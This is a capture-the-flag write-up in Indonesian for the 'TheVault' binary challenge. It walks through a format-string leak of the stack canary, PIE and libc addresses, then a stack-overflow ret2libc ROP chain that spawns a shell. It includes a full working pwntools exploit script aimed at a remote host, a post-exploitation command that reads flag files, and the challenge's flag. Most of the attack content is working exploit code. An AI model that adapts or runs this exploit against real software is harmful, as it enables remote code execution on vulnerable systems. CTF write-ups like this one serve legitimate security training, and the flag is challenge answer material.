# TheVault — PWN Writeup

## Ringkasan

Binary `chall` memiliki semua mitigasi aktif: Canary, PIE, Full RELRO, dan NX. Celah utama ada pada dua tahap input:

1. `fgets(buf, 0x80, stdin)` lalu `printf(buf)`
   Bagian ini menghasilkan bug format string karena input user dipakai langsung sebagai format string.

2. `read(0, buf, 0x200)`
   Bagian ini menghasilkan stack buffer overflow karena buffer stack lebih kecil daripada jumlah byte yang dibaca.

Strategi exploit:

1. Leak stack canary.
2. Leak return address PIE untuk menghitung base binary.
3. Leak alamat libc dari stack untuk menghitung base libc.
4. Overflow tahap kedua dengan payload ret2libc.
5. Jalankan `system("/bin/sh")`.
6. Baca flag.

Flag final:

```
0xV01D{d825e0958f7f90c4ee3d0738}
```

## File Challenge

File penting di folder challenge:

```
chall
libc.so.6
solve.py
```

Binary menggunakan libc yang disediakan challenge, sehingga exploit remote perlu memakai offset dari `libc.so.6` tersebut.

## Analisis Awal

Pemeriksaan awal:

```bash
file chall
checksec --file=chall
```

Hasil mitigasi:

```
Canary    : enabled
PIE       : enabled
NX        : enabled
RELRO     : Full RELRO
```

Implikasi mitigasi:

- Canary membuat overflow langsung gagal kalau nilai canary tidak diketahui.
- PIE membuat alamat binary berubah setiap run.
- NX membuat shellcode di stack tidak bisa dieksekusi.
- Full RELRO membuat overwrite GOT tidak praktis.

Karena itu exploit paling aman adalah:

```
format string leak -> hitung base address -> stack overflow -> ret2libc
```

## Analisis Bug

Dari static analysis, alur program terbagi menjadi dua input.

### Tahap 1 — Format String

Program membaca input pendek lalu memanggil:

```c
printf(buf);
```

Karena tidak memakai format literal seperti `printf("%s", buf)`, user bisa membaca isi stack menggunakan `%p`.

Format string yang stabil:

```
%23$p|%25$p|%29$p
```

Makna leak:

```
%23$p -> stack canary
%25$p -> return address PIE
%29$p -> return address libc
```

Contoh hasil leak lokal:

```
canary   = 0xfdf96c215296e900
PIE leak = base + 0x1147
libc leak= libc base + 0x2a1ca
```

Offset penting:

```python
PIE_RET_OFF  = 0x1147
LIBC_RET_OFF = 0x2a1ca
```

Base address dihitung dengan:

```python
pie_base = pie_ret - 0x1147
libc.address = libc_ret - 0x2a1ca
```

### Tahap 2 — Stack Overflow

Setelah format string, program memberi satu kesempatan input lagi:

```c
read(0, buf, 0x200);
```

Ukuran read `0x200` cukup besar untuk menimpa return address.

Layout stack yang dipakai:

```
buf              : 0x88 byte
canary           : +0x88
saved rbx / slot : +0x90
return address   : +0x98
```

Payload overflow:

```
'A' * 0x88
canary
saved rbx dummy
ROP chain
```

## ROP Chain

Karena NX aktif, exploit tidak memakai shellcode. Payload memakai ret2libc:

```
ret
pop rdi ; ret
/bin/sh
system
exit
```

Gadget `ret` tambahan dibutuhkan untuk stack alignment sebelum masuk ke `system()`. Tanpa alignment ini, exploit lokal sempat crash dengan SIGSEGV.

ROP chain final:

```python
payload = flat(
    b"A" * 0x88,
    p64(canary),
    p64(0),
    p64(ret),
    p64(pop_rdi),
    p64(binsh),
    p64(system),
    p64(exit_),
)
```

## Penyebab Solver Lokal Berhasil Tapi Remote Gagal

Exploit lokal sebenarnya sudah benar dan bisa mendapatkan shell:

```
PWNED
uid=1000(nata) gid=1000(nata) ...
```

Masalah remote ada pada kode berikut:

```python
if io.poll() is not None:
```

Objek `process()` dari pwntools punya method `.poll()`, tapi objek `remote()` tidak punya method tersebut. Akibatnya saat dijalankan remote:

```bash
python3 solve.py REMOTE
```

solver crash sebelum payload diuji sepenuhnya:

```
AttributeError: 'remote' object has no attribute 'poll'
```

Fix-nya adalah menghapus `.poll()` dan memakai handling universal yang berlaku untuk local maupun remote.

## Solver Final

Solver final:

```python
#!/usr/bin/env python3
from pathlib import Path
import re
import time
from pwn import *

BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "chall"
LIBC_PATH = BASE_DIR / "libc.so.6"

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
libc = ELF(str(LIBC_PATH), checksec=False)
context.arch = "amd64"
context.log_level = args.LOG or "info"

HOST = args.HOST or "35.192.106.100"
PORT = int(args.PORT or 20003)

FMT = b"%23$p|%25$p|%29$p"

BUF_TO_CANARY = 0x88
PIE_RET_OFF = 0x1147
LIBC_RET_OFF = 0x2A1CA


def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    if args.GDB:
        return gdb.debug(
            [str(BINARY_PATH)],
            env={"LD_LIBRARY_PATH": str(BASE_DIR)},
            gdbscript="""
set pagination off
continue
""",
        )

    return process([str(BINARY_PATH)], env={"LD_LIBRARY_PATH": str(BASE_DIR)})


def parse_leaks(data: bytes):
    m = re.search(
        rb"(0x[0-9a-fA-F]+)\|(0x[0-9a-fA-F]+)\|(0x[0-9a-fA-F]+)",
        data,
    )
    if not m:
        raise RuntimeError(f"could not parse leaks from: {data!r}")

    canary, pie_ret, libc_ret = (int(x, 16) for x in m.groups())

    if (canary & 0xFF) != 0:
        raise RuntimeError(f"bad canary leak: {canary:#x}")

    return canary, pie_ret, libc_ret


def build_payload(canary: int) -> bytes:
    rop = ROP(libc)

    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym.system
    exit_ = libc.sym.exit

    payload = flat(
        b"A" * BUF_TO_CANARY,
        p64(canary),
        p64(0),
        p64(ret),
        p64(pop_rdi),
        p64(binsh),
        p64(system),
        p64(exit_),
    )

    if len(payload) > 0x200:
        raise RuntimeError(f"payload too large: {len(payload)} bytes")

    return payload


def exploit(io):
    io.recvuntil(b"vault> ", timeout=5)
    io.sendline(FMT)

    data = io.recvuntil(b"one more gift?", timeout=5)
    canary, pie_ret, libc_ret = parse_leaks(data)

    pie_base = pie_ret - PIE_RET_OFF
    libc.address = libc_ret - LIBC_RET_OFF

    log.success("canary    = %#x", canary)
    log.success("PIE base  = %#x", pie_base)
    log.success("libc base = %#x", libc.address)

    payload = build_payload(canary)
    io.send(payload)

    time.sleep(0.35)

    cmd = args.CMD.encode() if args.CMD else (
        b"echo PWNED; cat /flag* /home/*/flag* 2>/dev/null; id"
    )
    io.sendline(cmd)

    try:
        out = io.recvrepeat(1.5)
        if out:
            print(out.decode(errors="replace"), end="")
    except EOFError:
        pass

    io.interactive()


def main():
    io = start()
    exploit(io)


if __name__ == "__main__":
    main()
```

## Flag

Flag berhasil didapat dari service remote:

```
0xV01D{d825e0958f7f90c4ee3d0738}
```
